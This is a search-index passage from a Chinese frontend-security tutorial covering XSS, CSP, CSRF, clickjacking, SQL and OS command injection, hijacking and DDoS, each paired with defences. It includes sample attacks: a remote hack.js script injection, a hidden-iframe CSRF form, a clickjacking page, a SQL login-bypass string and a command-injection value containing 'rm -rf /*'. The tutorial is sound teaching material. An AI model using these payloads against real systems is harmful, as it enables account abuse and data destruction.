\u542f\u2f64XSS\u8fc7\u6ee4(\u901a\u5e38\u6d4f\u89c8\u5668\ufa38\u662f\u9ed8\u8ba4\u7684)\u3002 \u5982\u679c\u68c0\u6d4b\u5230\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u6d4f\u89c8\u5668\ufa38\u5c06\u6e05\u9664\u2eda\u9875\u2faf\u9762(\u5220\u9664\u4e0d\uf967 \u5b89\u5168\u7684\u90e8\u5206)</p> <pre><code>ctx.set('X-XSS-Protection', 0) // \u7981\u2f4c\u6b62XSS\u8fc7\u6ee4\n// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; \u53ef\u4ee5\u62e6\u622a \u4f46\u4f2a\u88c5\u4e00\u4e0b\u5c31\u4e0d\u2f8f \u4e86\n</code></pre> <p>1;mode=block \u542f\u2f64XSS\u8fc7\u6ee4\u3002 \u5982\u679c\u68c0\u6d4b\u5230\u653b\u51fb\uff0c\u6d4f\u89c8\u5668\ufa38\u5c06\u4e0d\uf967\u4f1a\u6e05\u9664\u2eda\u9875\u2faf\u9762\uff0c\u2f7d\u800c\u662f\u963b\u2f4c\u6b62\u2eda\u9875\u2faf\u9762\u52a0\u8f7d\u3002 1; report= (Chromium only)</p> <p>\u542f\u2f64XSS\u8fc7\u6ee4\u3002 \u5982\u679c\u68c0\u6d4b\u5230\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u6d4f\u89c8\u5668\ufa38\u5c06\u6e05\u9664\u2eda\u9875\u2faf\u9762\u5e76\u4f7f\u2f64CSP report-uri \u6307\u4ee4\u7684\u529f \u80fd\u53d1\u9001\u8fdd\u89c4\u62a5\u544a\u3002</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#csp","title":"CSP","text":"<p>\u5185\u5bb9\u5b89\u5168\u7b56\u7565\uf976 (CSP, Content Security Policy) \u662f\u2f00\u4e00\u4e2a\u9644\u52a0\u7684\u5b89\u5168\u5c42\uff0c\u2f64\u4e8e\u5e2e\u52a9\u68c0\u6d4b\u548c\u7f13\u89e3\u67d0 \u4e9b\u7c7b\u578b\u7684\u653b\u51fb\uff0c\u5305\u62ec\u8de8\u7ad9\u811a\u672c (XSS) \u548c\u6570\u636e\u6ce8\u2f0a\u7b49\u653b\u51fb\u3002 \u8fd9\u4e9b\u653b\u51fb\u53ef\u2f64\u4e8e\u5b9e\u73b0\u4ece\u6570\u636e\u7a83\u53d6\u5230 \u2f79\u7f51\u7ad9\u7834\u574f\u6216\u4f5c\u4e3a\u6076\u610f\u8f6f\u4ef6\u5206\u53d1\u7248\u672c\u7b49\u2f64\u9014\u3002</p> <p>CSP \u672c\u8d28\u4e0a\u5c31\u662f\u5efa\u2f74\u7acb\u2f69\u540d\u5355\uff0c\u5f00\u53d1\u8005\u660e\u786e\u544a\u8bc9\u6d4f\u89c8\u5668\ufa38\u54ea\u4e9b\u5916\u90e8\u8d44\u6e90\u53ef\u4ee5\u52a0\u8f7d\u548c\u6267\u2f8f\u3002\u6211\u4eec\u53ea \u9700\u8981\u914d\u7f6e\u89c4\u5219\uff0c\u5982\u4f55\u62e6\u622a\u662f\u7531\u6d4f\u89c8\u5668\ufa38\u2f83\u81ea\u2f30\u5df1\u5b9e\u73b0\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u2f45\u5f0f\u6765\u5c3d\u91cf\uf97e\u51cf\u5c11 XSS \u653b \u51fb\u3002</p> <pre><code>// \u53ea\u5141\u8bb8\u52a0\u8f7d\u672c\u7ad9\u8d44\u6e90\nContent-Security-Policy: default-src 'self'\n\n// \u53ea\u5141\u8bb8\u52a0\u8f7d HTTPS \u534f\u8bae\u56fe\u2f5a\nContent-Security-Policy: img-src https://*\n\n// \u4e0d\u4e0d\u5141\u8bb8\u52a0\u8f7d\u4efb\u4f55\u6765\u6e90\u6846\u67b6\nContent-Security-Policy: child-src 'none'\n\nctx.set('Content-Security-Policy', \"default-src 'self'\")\n// \u5c1d\u8bd5\u2f00\u4e00\u4e0b\u5916\u90e8\u8d44\u6e90\u4e0d\u4e0d\u80fd\u52a0\u8f7d\nhttp://localhost:3000/?from=&lt;script src=\"http://localhost:4000/hack.js\"&gt; &lt;/script&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_3","title":"\u8f6c\u4e49\u5b57\u7b26","text":"<p>ejs\u8f6c\u4e49\u2f29\u77e5\u8bc6</p> <pre><code>&lt;% code %&gt;\u2f64\u4e8e\u6267\u2f8f\u5176\u4e2djavascript\u4ee3\u7801;\n&lt;%= code %&gt;\u4f1a\u5bf9code\u8fdb\u2f8fhtml\u8f6c\u4e49;\n&lt;%- code %&gt;\u5c06\u4e0d\u4e0d\u4f1a\u8fdb\u2f8f\u8f6c\u4e49\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_4","title":"\u9ed1\u540d\u5355","text":"<p>\u2f64\u6237\u7684\u8f93\u2f0a\u6c38\u8fdc\uf967\u53ef\u4fe1\u4efb\u7684\uff0c\u6700\u666e\u904d\u7684\u505a\u6cd5\u5c31\u662f\u8f6c\u4e49\u8f93\u2f0a\u8f93\u51fa\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u5f15\u53f7\u3001\u5c16\u62ec\u53f7\u3001\u659c\u6760 \u8fdb\u2f8f\u8f6c\u4e49</p> <pre><code>function escape(str) {\n  str = str.replace(/&amp;/g, '&amp;amp;')\n  str = str.replace(/&lt;/g, '&amp;lt;')\n  str = str.replace(/&gt;/g, '&amp;gt;')\n  str = str.replace(/\"/g, '&amp;quto;')\n  str = str.replace(/'/g, '&amp;#39;')\n  str = str.replace(/`/g, '&amp;#96;')\n  str = str.replace(/\\//g, '&amp;#x2F;')\n  return str\n}\n</code></pre> <p>\u5bcc\u2f42\u672c\u6765\u8bf4\uff0c\u663e\u7136\u4e0d\u80fd\u901a\u8fc7\u4e0a\u9762\u7684\u529e\u6cd5\u6765\u8f6c\u4e49\u6240\u6709\u5b57\u7b26\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u628a\u9700\u8981\u7684\u683c\u5f0f\u4e5f\u8fc7\u6ee4\u6389\u3002\u5bf9  \u4e8e\u8fd9\u79cd\u60c5\u51b5\uff0c\u901a\u5e38\u91c7\u2f64\u2f69\u540d\u5355\u8fc7\u6ee4\u7684\u529e\u6cd5\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u2fca\u9ed1\u540d\u5355\u8fc7\u6ee4\uff0c\u4f46\u662f\u8003\u8651\u5230\u9700\u8981\u8fc7\u6ee4\u7684  \u6807\u7b7e\u548c\u6807\u7b7e\u5c5e\u6027\u5b9e\u5728\u592a\u591a\uff0c\u66f4\u52a0\u63a8\u8350\u4f7f\u2f64\u2f69\u540d\u5355\u7684\u2f45\u5f0f\u3002</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_5","title":"\u2f69\u540d\u5355","text":"<pre><code>const xss = require('xss')\nlet html = xss('&lt;h1 id=\"title\"&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(\"xss\");&lt;/script&gt;')\n// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(\"xss\");&amp;lt;/script&amp;gt;\nconsole.log(html)\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#httponly-cookie","title":"HttpOnly Cookie","text":"<p>\u8fd9\u662f\u9884\u9632XSS\u653b\u51fb\u7a83\u53d6\u2f64\u6237cookie\u6700\u6709\u6548\u7684\u9632\u5fa1\u2f3f\u6bb5\u3002Web\u5e94 \u2f64\u7a0b\u5e8f\u5728\u8bbe\u7f6ecookie\u65f6\uff0c\u5c06\u5176 \u5c5e\u6027\u8bbe\u4e3aHttpOnly\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u8be5\u2f79\u7f51\u2eda\u9875\u7684cookie\u88ab\u5ba2\u6237\u7aef\u6076\u610fJavaScript\u7a83\u53d6\uff0c\u4fdd\u62a4\u2f64\u6237 cookie \u4fe1\u606f\u3002</p> <pre><code>response.addHeader(\"Set-Cookie\", \"uid=112; Path=/; HttpOnly\")\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#2csrf","title":"2\u3001CSRF","text":"<p>CSRF(Cross Site Request Forgery)\uff0c\u5373\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u2f00\u4e00\u79cd\u5e38\u2ec5\u89c1\u7684Web\u653b\u51fb\uff0c\u5b83\u5229\u2f64\u2f64\u6237\u5df2\u767b\u5f55\u7684\u8eab\u4efd\uff0c\u5728\u2f64\u6237\u6beb\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5\u2f64\u6237\u7684\u540d\u4e49\u5b8c\u6210\u2fae\u6cd5\u64cd\u4f5c\u3002</p> <ul> <li>\u2f64\u6237\u5df2\u7ecf\u767b\u5f55\u4e86\u7ad9\u70b9 A\uff0c\u5e76\u5728\u672c\u5730\u8bb0\u5f55\u4e86 cookie</li> <li>\u5728\u2f64\u6237\u6ca1\u6709\u767b\u51fa\u7ad9\u70b9 A \u7684\u60c5\u51b5\u4e0b(\u4e5f\u5c31\u662f cookie \u2f63\u751f\u6548\u7684\u60c5\u51b5\u4e0b)\uff0c\u8bbf\u95ee\u4e86\u6076\u610f\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u5f15\u8bf1\u5371\u9669\u7ad9\u70b9 B (B \u7ad9\u70b9\u8981\u6c42\u8bbf\u95ee\u7ad9\u70b9A)\u3002</li> <li>\u7ad9\u70b9 A \u6ca1\u6709\u505a\u4efb\u4f55 CSRF \u9632\u5fa1</li> </ul> <p>\u767b\u5f55 http://localhost:4000/csrf.html \u4e3b\u8981\u4f7f\u7528 iframe \u5d4c\u5957\u53e6\u4e00\u4e2a\u9875\u9762</p> <pre><code>document.write(`\n    &lt;form name=\"form\" action=\"http://3000/updateText\" method=\"post\" target=\"csrf\"&gt;\n        \u6dfb\u52a0\u8bc4\u8bba: &lt;input type=\"text\" name=\"text\" value=\"comment\"/&gt;\n    &lt;/form&gt;\n`)\n\nvar iframe = document.createElement('iframe');\niframe.name = 'csrf';\niframe.style.display = 'none';\ndocument.body.appendChild(iframe);\n\nsetTimeout(function() {\n  document.querySelector(form).submit();\n}, 1000);\n</code></pre> <p>\u7528\u6237\u70b9\u5f00\u8fd9\u4e2a\u94fe\u63a5\u540e\uff0c\u5df2\u7ecf\u5728 3000 \u7f51\u7ad9\u4e0a\u767b\u5f55\uff0c\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff08iframe \u4e0d\u663e\u793a\uff09\uff0c\u90a3\u4e48\u5c31\u4f1a\u7ed9 3000 \u7f51\u7ad9\u4e0a\u53d1\u51fa\u4e00\u4e2a\u8bc4\u8bba\uff0c\u8bc4\u8bba\u7684\u5185\u5bb9\u4f1a\u53d1\u9001\u5230 3000 \u4e0a\u9762\uff0c\u9020\u6210\u865a\u5047\u7684\u8bc4\u8bba\u3002\u6216\u8005\u8bc4\u8bba\u5185\u90e8\u6709\u5176\u4ed6\u975e\u6cd5\u4ee3\u7801\uff0c\u5176\u4ed6\u7528\u6237\u5728 3000 \u4e0a\u770b\u5230\u8fd9\u4e2a\u8bc4\u8bba\uff0c\u5c31\u4f1a\u83b7\u53d6\u5176\u4ed6\u7528\u6237\u7684\u4fe1\u606f\u3002\u6216\u8005\u5728\u8bc4\u8bba\u4e2d\u63d2\u51654000\u7684\u94fe\u63a5\uff0c\u8bf1\u5bfc\u5176\u4ed6\u7528\u6237\u70b9\u51fb4000\u94fe\u63a5\u3002</p> <p>\u8fd9\u4e2a\u8868\u5355\u63d0\u4ea4\u540e\uff0ctarget \u9700\u8981\u8bbe\u7f6e\u4e00\u4e0b\uff0c\u4e0d\u4f1a\u8df3\u8f6c\u5230\u5176\u4ed6\u9875\u9762\uff0c\u7528\u6237\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u63d0\u4ea4\u4e86\u8868\u5355</p> <p>\u6240\u4ee5\u67d0\u4e9b\u670d\u52a1\u7aef\u4f1a\u5224\u65ad\u5f53\u524d\u63d0\u4ea4\u7684\u662f iframe \u8fd8\u662f window\uff0c\u6216\u8005\u53ea\u5141\u8bb8\u81ea\u5df1\u7684\u57df\u4e0b\u7684\u9875\u9762\u63d0\u4ea4\u8868\u5355\u6216\u8005\u8bc4\u8bba\u3002</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#csrf","title":"CSRF\u653b\u51fb\u5371\u5bb3","text":"<p>\uf9dd\u2f64\u2f64\u6237\u767b\u5f55\u6001 \u2f64\u6237\uf967\u77e5\u60c5 \u5b8c\u6210\u4e1a\u52a1\u8bf7\u6c42 \u76d7\u53d6\u2f64\u6237\u8d44\u91d1(\u8f6c\u8d26\uff0c\u6d88\u8d39) \u5192\u5145\u2f64\u6237\u53d1\u5e16\u80cc\u9505 \u635f\u5bb3\u2f79\u7ad9\u58f0\u8a89</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_6","title":"\u9632\u5fa1","text":"<ul> <li>\u7981\u2f4c\u6b62\u7b2c\u4e09\u2f45\u2f79\u7f51\u7ad9\u5e26Cookie - \u6709\u517c\u5bb9\u6027\u95ee\u9898 Referer Check - Https\u4e0d\uf967\u53d1\u9001referer</li> </ul> <pre><code>app.use(async (ctx, next) =&gt; {\n    await next()\n        const referer = ctx.request.header.referer\n    console.log('Referer:', referer)\n})\n</code></pre> <ul> <li>\u9a8c\u8bc1\u7801</li> <li>Cookie \u503c\u8fdb\u884chash</li> </ul>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#3-clickjacking","title":"3\u3001\u70b9\u51fb\u52ab\u6301 - clickjacking","text":"<p>\u70b9\u51fb\u52ab\u6301\u662f\u2f00\u4e00\u79cd\u89c6\u89c9\u6b3a\u9a97\u7684\u653b\u51fb\u2f3f\u6bb5\u3002\u653b\u51fb\u8005\u5c06\u9700\u8981\u653b\u51fb\u7684\u2f79\u7f51\u7ad9\u901a\u8fc7 iframe \u5d4c\u5957\u7684\u2f45\u5f0f\u5d4c\u2f0a\u2f83\u2f30\u7684\u7f51\u9875\u4e2d\uff0c\u5e76\u5c06 iframe \u8bbe\u7f6e\u4e3a\u900f\u660e\uff0c\u5728\u2eda\u9875\u2faf\u9762\u4e2d\u900f\u51fa\u2f00\u4e00\u4e2a\u6309\u94ae\u8bf1\u5bfc\u2f64\u6237\u70b9\u51fb\u3002</p> <p>\u767b\u5f55 http://localhost:4000/clickjacking.html</p> <p>\u6211\u4eec\u5728\u9875\u9762\u4e2d\u6ce8\u5165\u4e00\u4e2a iframe\uff0c\u7136\u540e\u8bbe\u7f6e\u900f\u660e\uff0c\u7528\u6237\u65e0\u6cd5\u770b\u5230\u3002\u7136\u540e\u5728\u5f04\u4e00\u4e2a\u56fe\u7247\uff08\u7f8e\u5973\u6216\u8005\u62a2\u7ea2\u5305\uff09\u7528\u6237\u4f1a\u70b9\u51fb\u8fd9\u4e2a\u56fe\u7247\uff0c\u5b9e\u9645\u4e0a\u70b9\u51fb\u7684\u662f iframe \u4e2d\u7684\u5185\u5bb9\uff08\u4f8b\u5982\u6295\u7968\u6309\u94ae\uff09\uff0c\u8fd9\u6837\u7528\u6237\u5c31\u88ab\u70b9\u51fb\u52ab\u6301\u4e86\u3002</p> <pre><code>&lt;button&gt;\u70b9\u6211\u9886\u7ea2\u5305&lt;/button&gt;\n&lt;img src=\"./red-pocket.png\"/&gt;\n&lt;iframe src=\"http://localhost:3000\" scrolling=\"no\"&gt;&lt;/iframe&gt;\n</code></pre> <pre><code>iframe {\n  opacity: 0;\n}\nbutton: {\n  position: absolute;\n  top: xxx;\n  left: xxx;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_7","title":"\u9632\u5fa1","text":"<ul> <li>X-FRAME-OPTIONS\u662f\u2f00\u4e00\u4e2a HTTP \u54cd\u5e94\u5934\uff0c\u5728\u73b0\u4ee3\u6d4f\u89c8\u5668\ufa38\u6709\u2f00\u4e00\u4e2a\u5f88\u597d\u7684\u2f40\u6301\u3002\u8fd9\u4e2a HTTP \u54cd\u5e94\u5934 \u5c31\u662f\u4e3a\u4e86\u9632\u5fa1\u2f64 iframe \u5d4c\u5957\u7684\u70b9\u51fb\u52ab\u6301\u653b\u51fb\u3002 \u8be5\u54cd\u5e94\u5934\u6709\u4e09\u4e2a\u503c\u53ef\u9009\uff0c\u5206\u522b\u662fDENY\uff0c\u8868\u793a\u2eda\u9875\u2faf\u9762\u4e0d\uf967\u5141\u8bb8\u901a\u8fc7 iframe \u7684\u2f45\u5f0f\u5c55\u793a SAMEORIGIN\uff0c\u8868\u793a\u2eda\u9875\u2faf\u9762\u53ef\u4ee5\u5728\u76f8\u540c\u57df\u540d\u4e0b\u901a\u8fc7 iframe \u7684\u2f45\u5f0f\u5c55\u793a ALLOW-FROM\uff0c\u8868\u793a\u2eda\u9875\u2faf\u9762\u53ef\u4ee5\u5728\u6307\u5b9a\u6765\u6e90\u7684 iframe \u4e2d\u5c55\u793a</li> </ul> <pre><code>ctx.set('X-FRAME-OPTIONS', 'DENY')\n</code></pre> <ul> <li>JS\u2f45\u5f0f\uff0c\u5224\u65ad\u5f53\u65f6\u662f\u5426\u5b58\u5728 iframe\uff0c\u5982\u679c\u5b58\u5728 iframe\uff0c\u90a3\u4e48\u5c31\u628a iframe \u5f53\u505a\u73b0\u5728\u7684\u7a97\u53e3\uff0c\u5c31\u4e0d\u4f1a\u663e\u793a\u653b\u51fb\u8005\u7684\u7a97\u53e3\u4e86\u3002</li> </ul> <pre><code>&lt;head&gt;\n  &lt;style id=\"click-jack\"&gt;\n    html {\n      display: none !important;\n    }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;script&gt;\n    // self \u662f\u81ea\u5df1 == window\n    // top \u8fd4\u56de\u9876\u5c42\u7a97\u53e3\uff08\u6d4f\u89c8\u5668\u7a97\u53e3\uff09\n    if (self == top) {\n      var style = document.getElementById('click-jack')\n      document.body.removeChild(style)\n    } else {\n      top.location = self.location\n    }\n  &lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>\u4ee5\u4e0a\u4ee3\u7801\u7684\u4f5c\u2f64\u5c31\u662f\u5f53\u901a\u8fc7 iframe \u7684\u2f45\u5f0f\u52a0\u8f7d\u2eda\u9875\u2faf\u9762\u65f6\uff0c\u653b\u51fb\u8005\u7684\u2f79\u7f51\u2eda\u9875\u76f4\u63a5\u4e0d\uf967\u663e\u793a\u6240\u6709\u5185\u5bb9\u4e86\u3002 </p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#sql","title":"SQL\u6ce8\u2f0a","text":"<p>\u4f8b\u5982\u767b\u5f55\u9875\u9762\uff0c\u5982\u679c\u76f4\u63a5\u628a\u7528\u6237\u540d\u548c\u5bc6\u7801\u4f5c\u4e3a SQL \u8bed\u53e5\u53c2\u6570\u53bb\u6267\u884c\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fd9\u6837\u6ce8\u5165</p> <pre><code># \u586b\u2f0a\u7279\u6b8a\u5bc6\u7801 1'or'1'='1\n\n# \u62fc\u63a5\u540e\u7684SQL\nSELECT * FROM test.user WHERE username = 'laowang' AND password = '1'or'\n\n # \u5b9e\u9645\u4e0a where \u6709\u4e86 or 1'='1' \n # \u59cb\u7ec8\u8fd4\u56de\u771f\uff0c\u5c31\u767b\u5f55\u6210\u529f\u4e86\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_8","title":"\u9632\u5fa1","text":"<p>\u6240\u6709\u7684\u67e5\u8be2\u8bed\u53e5\u5efa\u8bae\u4f7f\u2f64\u6570\u636e\u5e93\u63d0\u4f9b\u7684\u53c2\u6570\u5316\u67e5\u8be2\u63a5\u53e3\uff0c\u53c2\u6570\u5316\u7684\u8bed\uf906\u4f7f\u2f64\u53c2\u6570\uff0c\u800c\u4e0d\u662f\u5c06\u2f64\u6237 \u8f93\u2f0a\u53d8\uf97e\u5d4c\u2f0a\u5230 SQL \u8bed\u53e5\u4e2d\uff0c\u5373\u4e0d\u8981\u76f4\u63a5\u62fc\u63a5 SQL \u8bed\uf906\u3002\u4f8b\u5982 Node.js \u4e2d\u7684 mysqljs \u5e93\u7684 query \u2f45\u6cd5\u4e2d\u7684 ? \u5360\u4f4d\u53c2\u6570\u3002</p> <pre><code>// \u9519\u8bef\u5199\u6cd5\nconst sql = ` SELECT * FROM test.user WHERE username = '${ctx.request.body.username}' AND password = '${ctx.request.body.password}'`;\nconsole.log('sql', sql)\nres = await query(sql)\n\n//\u6b63\u786e\u7684\u5199\u6cd5\nconst sql = 'SELECT * FROM test.user WHERE username = ? AND password = ?';\nconsole.log('sql', sql, )\nres = await query(sql, [ctx.request.body.username, ctx.request.body.password]);\n</code></pre> <p>\u4e25\u683c\u9650\u5236Web\u5e94\u2f64\u7684\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u6743\u9650\uff0c\u7ed9\u6b64\u2f64\u6237\u63d0\u4f9b\u4ec5\u80fd\u591f\u6ee1\u8db3\u5176\u5de5\u4f5c\u7684\u6700\u4f4e\u6743\u9650\uff0c\u4ece\u2f7d\u800c \u6700\u5927\u9650\u5ea6\u7684\u51cf\u5c11\u6ce8\u2f0a\u653b\u51fb\u5bf9\u6570\u636e\u5e93\u7684\u5371\u5bb3 \u540e\u7aef\u4ee3\u7801\u68c0\u67e5\u8f93\u2f0a\u7684\u6570\u636e\u662f\u5426\u7b26\u5408\u9884\u671f\uff0c\u4e25\u683c\u9650\u5236\u53d8\u91cf\uf97e\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\u4f7f\u2f64\u6b63\u5219\u8868\u8fbe\u5f0f\u8fdb\u2f8f\u4e00\u4e9b\u5339\u914d\u5904\u7406\u3002</p> <p>\u5bf9\u8fdb\u2f0a\u6570\u636e\u5e93\u7684\u7279\u6b8a\u5b57\u7b26('\uff0c\"\uff0c\\\uff0c&lt;\uff0c&gt;\uff0c&amp;\uff0c*\uff0c; \u7b49)\u8fdb\u2f8f\u8f6c\u4e49\u5904\u7406\uff0c\u6216\u7f16\u7801\u8f6c\u6362\u3002\u57fa\u672c\u4e0a\u6240\u6709\u7684\u540e\u7aef\u8bed\u2f94\u8a00\u90fd\u6709\u5bf9\u5b57\u7b26\u4e32\uf905\u8fdb\u2f8f\u8f6c\u4e49\u5904\u7406\u7684\u2f45\u6cd5\uff0c\u2f50\u6bd4\u5982 lodash \u7684 lodash._escapehtmlchar \u5e93\u3002</p>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#os","title":"OS\u6ce8\u2f0a","text":"<p>OS\u547d\u4ee4\u6ce8\u2f0a\u548cSQL\u6ce8\u2f0a\u5dee\u4e0d\uf967\u591a\uff0c\u53ea\u4e0d\uf967\u8fc7SQL\u6ce8\u2f0a\u662f\u9488\u5bf9\u6570\u636e\u5e93\u7684\uff0c\u2f7d\u800cOS\u547d\u4ee4\u6ce8\u2f0a\u662f\u9488\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7684\u3002OS\u547d\u4ee4 \u6ce8\u2f0a\u653b\u51fb\u6307\u901a\u8fc7Web\u5e94\u2f64\uff0c\u6267\u2f8f\u2fae\u975e\u6cd5\u7684\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u8fbe\u5230\u653b\u51fb\u7684\u2f6c\u76ee\u7684\u3002\u53ea\u8981\u5728\u80fd\u8c03\u2f64Shell\u51fd\u6570\u7684\u5730\u2f45\u5c31\u6709 \u5b58\u5728\u88ab\u653b\u51fb\u7684\u2edb\u98ce\u9669\u3002\u5018\u82e5\u8c03\u2f64Shell\u65f6\u5b58\u5728\u758f\u6f0f\uf94e\uff0c\u5c31\u53ef\u4ee5\u6267\u2f8f\u63d2\u2f0a\u7684\u2fae\u975e\u6cd5\u547d\u4ee4\u3002</p> <pre><code>// \u4ee5 Node.js \u4e3a\u4f8b\u4f8b\uff0c\u5047\u5982\u5728\u63a5\u2f1d\u53e3\u4e2d\u9700\u8981\u4ece github \u4e0b\u8f7d\u2f64\u6237\u6307\u5b9a\u7684 repo const exec = require('mz/child_process').exec;\nlet params = {/* \u2f64\u6237\u8f93\u2f0a\u7684\u53c2\u6570 */};\nexec(`git clone ${params.repo} /some/path`);\n</code></pre> <p>\u5982\u679c\u4f20\u2f0a\u7684\u53c2\u6570\u662f\u4f1a\u600e\u6837</p> <pre><code>  https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#_9","title":"\u8bf7\u6c42\u52ab\u6301","text":"<ul> <li>DNS\u52ab\u6301 \u987e\u540d\u601d\u4e49\uff0cDNS\u670d\u52a1\u5668\ufa38(DNS\u89e3\u6790\u5404\u4e2a\u6b65\u9aa4)\u88ab\u7be1\u6539\uff0c\u4fee\u6539\u4e86\u57df\u540d\u89e3\u6790\u7684\u7ed3\u679c\uff0c\u4f7f\u5f97\u8bbf\u95ee\u5230\u7684\u4e0d\uf967\u662f\u9884\u671f\u7684ip</li> <li>HTTP\u52ab\u6301 \u8fd0\u8425\u5546\u52ab\u6301\uff0c\u6b64\u65f6\u2f24\u5927\u6982\u53ea\u80fd\u5347\u7ea7HTTPS\u4e86</li> </ul>"},{"location":"ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/#ddos","title":"DDOS","text":"<p>http://www.ruanyifeng.com/blog/2018/06/ddos.html \u962e\uf9c6\u2f00\u4e00\u5cf0</p> <p>distributed denial of service</p> <p>DDOS \u4e0d\uf967\u662f\u2f00\u4e00\u79cd\u653b\u51fb\uff0c\u2f7d\u800c\u662f\u2f00\u4e00\u2f24\u5927\u7c7b\u653b\u51fb\u7684\u603b\u79f0\u3002\u5b83\u6709\u2f0f\u51e0\u2f17\u5341\u79cd\u7c7b\u578b\uff0c\u65b0\u7684\u653b\u51fb\u2f45\u6cd5\u8fd8\u5728\u4e0d\uf967\u65ad\u53d1\u660e\u51fa\u6765\u3002\u2f79\u7f51 \u7ad9\u8fd0\u2f8f\u7684\u5404\u4e2a\u73af\u8282\uff0c\u90fd\u53ef\u4ee5\u662f\u653b\u51fb\u2f6c\u76ee\u6807\u3002\u53ea\u8981\u628a\u2f00\u4e00\u4e2a\u73af\u8282\u653b\u7834\uff0c\u4f7f\u5f97\u6574\u4e2a\u6d41\u7a0b\u8dd1\u4e0d\uf967\u8d77\u6765\uff0c\u5c31\u8fbe\u5230\u4e86\u762b\u75ea \u670d\u52a1\u7684\u2f6c\u76ee\u7684\u3002</p> <p>\u5176\u4e2d\uff0c\u2f50\u6bd4\u8f83\u5e38\u2ec5\u89c1\u7684\u2f00\u4e00\u79cd\u653b\u51fb\u662f cc \u653b\u51fb\u3002\u5b83\u5c31\u662f\u7b80\u5355\u7c97\u66b4\ufa06\u5730\u9001\u6765\u2f24\u5927\u91cf\uf97e\u6b63\u5e38\u7684\u8bf7\u6c42\uff0c\u8d85\u51fa\u670d\u52a1\u5668\ufa38\u7684\u6700\u2f24\u5927\u627f \u53d7\u91cf\uf97e\uff0c\u5bfc\u81f4\u5b95\u673a\u3002\u6211\u906d\u9047\u7684\u5c31\u662f cc \u653b\u51fb\uff0c\u6700\u591a\u7684\u65f6\u5019\u5168\u4e16\u754c\u2f24\u5927\u698220\u591a\u4e2a IP \u5730\u5740\u8f6e\u6d41\u53d1\u51fa\u8bf7\u6c42\uff0c\u6bcf\u4e2a\u5730 